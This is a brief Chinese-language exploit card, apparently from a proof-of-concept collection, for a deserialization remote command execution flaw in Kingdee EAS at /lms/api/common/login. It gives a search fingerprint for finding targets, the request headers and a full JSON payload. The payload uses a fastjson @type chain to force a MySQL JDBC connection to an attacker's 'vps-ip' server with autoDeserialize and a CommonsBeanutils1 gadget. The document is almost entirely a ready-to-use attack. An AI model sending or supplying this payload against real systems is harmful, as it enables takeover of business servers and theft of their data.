# 金蝶EASloginjdbc存在反序列化命令执行漏洞

- **系统**：金蝶　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`app="Kingdee-EAS"`
- **请求**：`POST /lms/api/common/login HTTP/1.1`
- **关键头**：`Content-Length: 358`　`localization: zh_CN`

**请求体 / payload**
```
like Gecko) Chrome/91.0.4472.77 Safari/537.36
Content-Type: application/json;charset=UTF-8
Origin: http://127.0.0.1
Referer: http://127.0.0.1/Login?redirect=%2F
Cookie: Language.CultureName=zh_CN
{"x":{"@type":"java.lang.AutoCloseable","@type":"com.mysql.jdbc.JDBC4Conne
ction","hostToConnectTo":"vps-ip","portToConnectTo":3306,"info":{"user":"C
ommonsBeanutils1","password":"123456","useSSL":"false","statementIntercept
ors":"com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor","autoDeseri
alize":"true"},"databaseToConnectTo":"mysql","url":""}}
```
- **预期**：200　|　—